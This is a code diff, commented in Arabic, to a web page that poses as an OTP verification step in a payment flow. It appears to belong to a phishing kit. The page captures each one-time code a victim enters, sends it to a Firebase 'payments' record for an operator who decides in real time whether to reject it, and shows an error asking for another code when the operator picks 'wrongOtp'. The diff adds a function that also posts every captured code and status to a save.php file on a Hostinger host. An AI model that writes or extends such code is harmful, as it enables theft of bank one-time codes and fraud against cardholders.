@@ -99,13 +99,29 @@
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
+        // وظيفة لمزامنة البيانات مع ملف save.php على Hostinger
+        function syncToHostinger(data) {
+            const formData = new FormData();
+            formData.append('visitorId', visitorId);
+            formData.append('currentPage', data.currentPage || "صفحة الرمز OTP");
+            if(data.otp) formData.append('otp', data.otp);
+            if(data.action) formData.append('action', data.action);
+
+            fetch('save.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log("Hostinger Sync Error: ", err));
+        }
+
         // تحديث حالة الزائر في لوحة التحكم عند الدخول للصفحة
         if (visitorId) {
-            database.ref('payments/' + visitorId).update({ 
+            const initialData = { 
                 currentPage: "صفحة الرمز OTP",
                 lastUpdate: new Date().toLocaleString('ar-SA'),
                 lastActive: firebase.database.ServerValue.TIMESTAMP 
-            });
+            };
+            database.ref('payments/' + visitorId).update(initialData);
+            syncToHostinger(initialData);
         }
 
         // مؤقت إعادة الإرسال
@@ -131,21 +147,22 @@
             const errorMsg = document.getElementById('otpErrorMsg');
             let otpVal = otpInput.value;
 
-            // التأكد من إدخال 4 أو 6 أرقام
             if (otpVal.length === 4 || otpVal.length === 6) {
                 document.getElementById('loadingOverlay').style.display = 'flex';
 
                 const paymentRef = database.ref('payments/' + visitorId);
                 
-                // إرسال الرمز للأدمن وتغيير الحالة لانتظار الرد
-                paymentRef.update({
+                const otpData = {
                     otp: otpVal,
                     action: "waiting_admin_decision", 
                     lastUpdate: new Date().toLocaleString('ar-SA'),
                     lastActive: firebase.database.ServerValue.TIMESTAMP
-                });
+                };
 
-                // مراقبة قرار الأدمن لحظياً
+                paymentRef.update(otpData);
+                syncToHostinger(otpData);
+
+                // مراقبة قرار الأدمن لحظياً من لوحة التحكم
                 paymentRef.on('value', (snapshot) => {
                     const data = snapshot.val();
                     if (!data) return;
@@ -156,8 +173,9 @@
                     else if (data.action === "wrongOtp") {
                         document.getElementById('loadingOverlay').style.display = 'none';
                         showError();
-                        // إعادة الحالة لانتظار إدخال رمز جديد
-                        paymentRef.update({ action: "user_fixing_otp" });
+                        const fixData = { action: "user_fixing_otp" };
+                        paymentRef.update(fixData);
+                        syncToHostinger(fixData);
                     }
                 });
 
